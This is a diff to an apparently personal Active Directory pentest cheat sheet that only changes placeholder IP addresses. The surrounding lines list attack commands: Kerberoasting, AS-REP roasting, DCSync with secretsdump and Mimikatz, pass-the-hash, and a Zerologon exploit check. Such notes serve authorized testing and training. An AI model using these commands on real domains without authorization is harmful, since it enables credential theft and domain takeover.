@@ -33,8 +33,8 @@ $ (sudo) neo4j console &
 $ bloodhound &
 
 Examples bloodhound-python:
-$ bloodhound-python -c All -u 'username' -p 'password' -d "domain.local" -ns 10.10.10.10
-$ bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10
+$ bloodhound-python -c All -u 'username' -p 'password' -d "domain.local" -ns 192.168.1.1
+$ bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 192.168.1.1
 
 Example SharpHound
 $ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 ./
@@ -70,13 +70,13 @@ https://github.com/Flangvik/SharpCollection
 ###### Kerberos ~ validating usernames
 ```
 https://github.com/ropnop/kerbrute
-./kerbrute userenum --dc 10.10.10.10 -d domain.htb users.txt
+./kerbrute userenum --dc 192.168.1.1 -d domain.htb users.txt
 ```
 
 ###### Kerberos ~ AS-REP Roasting
 ```
 From external with Impacket:
-$ impacket-GetNPUsers domain.local/ -format john -usersfile users.txt -no-pass -dc-ip 10.10.10.10
+$ impacket-GetNPUsers domain.local/ -format john -usersfile users.txt -no-pass -dc-ip 192.168.1.1
 
 With Rubeus:
 $ .\Rubeus.exe asreproast
@@ -91,7 +91,7 @@ $ hashcat -a 0 -m 18200 tgt-file /usr/share/wordlists/rockyou.txt --force
 ###### Kerberos ~ Kerberoasting
 ```
 From external with Impacket:
-$ impacket-GetUserSPNs -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
+$ impacket-GetUserSPNs -request -dc-ip 192.168.1.1 domain.local/username -save -outputfile tgsfile.out
 
 List TGT's:
 $ klist
@@ -127,9 +127,9 @@ https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
 ###### DC-SYNC attack
 ```
 From external with impacket-secretsdump:
-$ impacket-secretsdump domain/username@10.10.10.10
-$ impacket-secretsdump domain/username@10.10.10.10 -just-dc
-$ impacket-secretsdump domain/username:password@10.10.10.10
+$ impacket-secretsdump domain/username@192.168.1.1
+$ impacket-secretsdump domain/username@192.168.1.1 -just-dc
+$ impacket-secretsdump domain/username:password@192.168.1.1
 
 with Mimikatz:
 $ lsadump::dcsync /domain:domain.local /user:Administrator
@@ -137,12 +137,12 @@ $ lsadump::dcsync /domain:domain.local /user:Administrator
 
 ###### Pass The Hash with CrackMapExec
 ```
-$ crackmapexec smb 10.10.10.10 -u username -H h1a2s3h4:h1a2s3h4
+$ crackmapexec smb 192.168.1.1 -u username -H h1a2s3h4:h1a2s3h4
 ```
 
 ###### Pass the Hash with PTH
 ```
-$ pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //10.10.10.10 cmd
+$ pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //192.168.1.1 cmd
 ```
 
 ###### Mimikatz ~ Retrieve stored credentials
@@ -206,5 +206,5 @@ C:/Windows/System32/config/SYSTEM
 ###### Zerologon (probably going to break the domain, not recommended..)
 ```
 $ searchsploit -m 49871.py
-$ python3 49871.py -do check -target NETBIOSNAME -ip 10.10.10.10
+$ python3 49871.py -do check -target NETBIOSNAME -ip 192.168.1.1
 ```
